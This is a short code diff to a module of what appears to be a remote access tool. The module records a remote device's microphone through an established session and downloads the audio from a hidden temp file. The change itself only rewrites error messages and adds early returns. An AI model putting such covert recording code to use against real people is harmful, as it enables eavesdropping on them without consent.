@@ -47,7 +47,8 @@ class command:
 			        h.info_general("Recording mic...")
                     result = json.loads(session.send_command(cmd_data))
                     if 'error' in result:
-                        h.info_error("Error: " + result['error'] + "!")
+                        h.info_error("Failed to record mic!")
+			return
                     elif 'status' in result and result['status'] == 1:
                         data = session.download_file("/tmp/.avatmp")
                         f = open(os.path.join(dest,'mic.caf'),'w')
@@ -71,7 +72,8 @@ class command:
                         rp = os.path.split(dest)[1]
                         result = json.loads(session.send_command(cmd_data))
                         if 'error' in result:
-                            h.info_error("Error: " + result['error'] + "!")
+                            h.info_error("Failed to record mic!")
+			    return
                         elif 'status' in result and result['status'] == 1:
                             data = session.download_file("/tmp/.avatmp")
                             f = open(os.path.join(pr,rp),'w')
